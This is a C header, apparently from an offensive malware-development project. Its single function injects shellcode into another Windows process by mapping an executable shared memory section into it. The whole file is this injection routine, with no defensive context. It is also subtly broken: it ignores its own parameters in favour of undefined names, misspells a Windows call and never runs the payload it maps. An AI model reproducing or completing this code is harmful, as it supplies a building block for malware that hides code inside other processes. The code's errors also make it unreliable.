#pragma once
#include <Windows.h>
#include <stdio.h>
#include "api.h"

BOOL PayloadExecute(IN HANDLE hProcess, IN OPTIONAL HANDLE hThread, IN PBYTE pShellcodeAddress, IN SIZE_T sShellcodeSize, OUT PBYTE* ppInjectionAddress, OUT OPTIONAL HANDLE* phThread) {

	BOOL        bSTATE            = TRUE;
	HANDLE      hFile             = NULL;
	PVOID       pMapLocalAddress  = NULL,
                pMapRemoteAddress = NULL;

    
	hFile = CreateFileMapping(INVALID_HANDLE_VALUE, NULL, PAGE_EXECUTE_READWRITE, NULL, sPayloadSize, NULL);
	if (hFile == NULL) {
		printf("\t[!] CreateFileMapping Failed With Error : %d \n", GetLastError());
		bSTATE = FALSE; goto _EndOfFunction;
	}
  
	pMapLocalAddress = pMapViewOfFile(hFile, FILE_MAP_WRITE, NULL, NULL, sPayloadSize);
	if (pMapLocalAddress == NULL) {
		printf("\t[!] MapViewOfFile Failed With Error : %d \n", GetLastError());
		bSTATE = FALSE; goto _EndOfFunction;
	}

	memcpy(pMapLocalAddress, pPayload, sPayloadSize);

	pMapRemoteAddress = MapViewOfFile2(hFile, hProcess, NULL, NULL, NULL, NULL, PAGE_EXECUTE_READWRITE);
	if (pMapRemoteAddress == NULL) {
		printf("\t[!] MapViewOfFile2 Failed With Error : %d \n", GetLastError());
		bSTATE = FALSE; goto _EndOfFunction;
	}

	printf("\t[+] Remote Mapping Address : 0x%p \n", pMapRemoteAddress);

_EndOfFunction:
	*ppAddress = pMapRemoteAddress;
	if (hFile)
		CloseHandle(hFile);
	return bSTATE;
}
